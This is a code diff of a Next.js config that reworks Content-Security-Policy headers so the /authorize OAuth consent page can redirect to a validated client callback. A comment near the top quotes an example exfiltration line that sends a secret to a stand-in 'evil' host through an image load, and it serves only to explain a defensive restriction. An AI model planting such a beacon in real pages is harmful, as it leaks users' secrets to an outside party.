@@ -11,7 +11,7 @@ import type { NextConfig } from "next";
 // markup exfiltrate data via new Image().src = 'https://evil/?x='+secret,
 // which connect-src's 'self' does nothing to stop (image loads aren't
 // fetch/XHR). The cost: note images hosted on other https domains won't load.
-const CSP = [
+const CSP_DIRECTIVES = [
   "default-src 'self'",
   "script-src 'self' 'unsafe-inline'",
   "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
@@ -22,7 +22,23 @@ const CSP = [
   "base-uri 'self'",
   "form-action 'self'",
   "frame-ancestors 'none'",
-].join('; ');
+];
+
+const CSP = CSP_DIRECTIVES.join('; ');
+
+// The consent form is the one page whose whole purpose is to submit and then
+// land the browser on ANOTHER origin — the client's OAuth callback. Chrome
+// applies form-action across the redirect a submission produces, so
+// "form-action 'self'" silently kills the last step of the flow: the button
+// appears to do nothing. Measured live 2026-08-20, with a client whose
+// callback was http://localhost:43231 — the authorization only completed on a
+// ctrl-click, which opens a new context and escapes the check.
+//
+// Two CSP headers are enforced as an intersection, so the route cannot loosen
+// this by sending its own — the global rule has to stop applying here, and
+// /authorize sends a complete policy of its own instead (app/authorize),
+// naming the one callback origin it has just validated rather than opening
+// form-action up for everyone.
 
 const nextConfig: NextConfig = {
   output: "standalone",
@@ -32,7 +48,17 @@ const nextConfig: NextConfig = {
   async headers() {
     return [
       {
-        source: '/(.*)',
+        source: '/authorize',
+        headers: [
+          // No Content-Security-Policy here on purpose: the route sends its
+          // own, naming the single callback origin it has just validated.
+          { key: 'X-Content-Type-Options', value: 'nosniff' },
+          { key: 'X-Frame-Options', value: 'DENY' },
+          { key: 'Referrer-Policy', value: 'no-referrer' },
+        ],
+      },
+      {
+        source: '/((?!authorize$).*)',
         headers: [
           { key: 'Content-Security-Policy', value: CSP },
           { key: 'X-Content-Type-Options', value: 'nosniff' },
